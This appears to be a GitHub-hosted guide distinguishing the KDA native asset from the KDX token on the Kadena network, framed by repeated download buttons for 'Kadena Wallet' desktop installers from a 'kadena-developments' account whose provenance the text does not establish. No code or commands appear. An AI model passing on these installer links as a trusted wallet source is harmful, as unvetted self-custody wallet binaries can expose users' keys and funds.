![Kadena Wallet](assets/banner-article.png)

<h1 align="center">KDA and KDX Are Not the Same Token: What Each One Is</h1>

<p align="center">A Kadena Wallet guide to the network and the market.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Two tickers on one network, three letters apart, and a habit of being used interchangeably in conversation. KDA is the asset the chain runs on. KDX is a separate token issued on top of it, with its own arrangements and its own risks. Confusing them produces two specific problems: expecting gas from an asset that cannot pay it, and sending value to a place it cannot go.

## You'll see this if

- You hold both and are not sure which one pays fees.
- A wallet shows KDA but not KDX, and you are wondering whether something is wrong.
- You are reading about staking or bonding and cannot tell which token is involved.
- Someone told you KDX is "the Kadena token" and you want the distinction in plain terms.

## The short version

| | KDA | KDX |
| --- | --- | --- |
| What it is | The network's native asset | A separate token issued on the network |
| Produced by | Mining, as the block reward | Its own arrangement, not block rewards |
| Pays transaction fees | Yes | No |
| Shown by default in a KDA wallet | Yes | Not necessarily |
| Exists without the other | The chain runs on KDA alone | Depends on the network KDA secures |

The table is the whole distinction. Everything else is consequence.

## Why the native asset is different in kind

KDA is not a token that happens to be listed first. It is the unit the protocol charges for computation and pays for blocks. Gas is denominated in it, mining rewards are paid in it, and the security of the network is priced in it.

That status gives it three properties no issued token has:

1. **It can always pay a fee.** A transaction needs gas, and gas is KDA. Holding only KDX leaves you unable to move anything.
2. **It exists by definition.** No issuer can withdraw it, pause it or migrate it. The chain's own economics produce it.
3. **Its supply is a protocol question**, not a company decision, which is why figures for it come from the chain rather than a treasury.

An issued token has none of those. It exists because a contract defines it, it moves because a contract permits it, and it is worth what a market says.

## What that means in a wallet

A Kadena wallet is built around accounts and the native asset. It will show your KDA balance because KDA is what the account holds.

A token like KDX lives in the same account model but is not the balance the wallet reports by default. Some wallets display token holdings; others require you to add or look up the token. Neither behaviour is a fault, and neither means the tokens are missing.

The rule: an empty token list is not an empty account. Check the account on an explorer, which reports what the account actually holds rather than what the interface chose to render.

## Where the confusion costs money

**Paying fees with the wrong asset.** A token cannot pay gas. Someone holding a large KDX balance and no KDA cannot send a transaction at all, which reads as a broken wallet and is really an empty gas tank.

**Sending to the wrong destination.** A token transfer goes to an account that can receive that token. Treating a token address and a KDA address as interchangeable produces a transfer that either fails or lands somewhere unusable.

**Reading a price chart for the wrong asset.** Tickers collide across exchanges and aggregators. A chart labelled with three letters is not evidence about which contract it tracks, and thin markets make the error easy to miss.

**Assuming a governance link.** Holding an issued token does not confer any right over the network, and holding KDA does not entitle you to anything an issuer promised.

## How to tell them apart, practically

1. **Read the contract or module name**, not the ticker. The ticker is a label; the definition is the thing.
2. **Check which asset pays the fee** in any transaction you are about to sign. If the wallet is asking for KDA, you are on the native asset.
3. **Look at the account on an explorer** and read the holdings list rather than the wallet's summary.
4. **Do not convert tickers between venues.** An asset on one platform is not automatically the same asset on another, particularly after a delisting wave.

## The staking question, briefly

Staking and bonding arrangements in this ecosystem concern issued tokens, not the native asset. That matters because the risk profile is different: a native balance depends on the chain continuing, while a staked position depends on a contract, an operator and a programme that may stop being maintained.

KDA does not need to be staked to be held, spent or mined. If someone offers you staking on KDA itself, the first question is what the arrangement actually does with the asset.

## What is not established

The status of KDX after the network's governance change is not documented in any source I could verify. Issued tokens are not covered by the community's node maintenance, and nothing about the chain continuing implies that a particular token programme continued with it.

That is a statement about evidence, not about the token's fate. Treat any claim either way as unverified until it comes with a contract address and a date.

## FAQ

**Can I pay fees with KDX?**
No. Gas is denominated in KDA, and a transaction without it does not execute.

**Why does my wallet show KDA but not KDX?**
Because KDA is the account's native balance and KDX is a token the interface may not render by default. Check the account on an explorer.

**Is KDX mined?**
No. Block rewards are paid in KDA. A token is issued by its own definition rather than produced by consensus.

**Are they interchangeable at an exchange?**
No. Different assets, different markets, and after the delisting wave, different availability.

**Does holding KDX give me any say in the network?**
No. Governance of the chain sits with the multisig that holds platform keysets, and token holdings do not confer a role in that.

## Related reading

- What Kadena Wallet is, and what self-custody actually means
- KDX staking after the shutdown: what still works
- Community Edition of Kadena, explained
- Why KDA was delisted: the exchange decisions, in order

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [KDX Staking After the Shutdown: What Still Works](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/kdx-staking-after-kadena-shutdown.md)
- [Bridges to and from Kadena: What Exists and What It Costs You](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/kadena-bridge-options-and-risk.md)
- [Best Kadena Wallet in 2026: Every Option That Still Works](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/best-kadena-wallet-in-2026.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
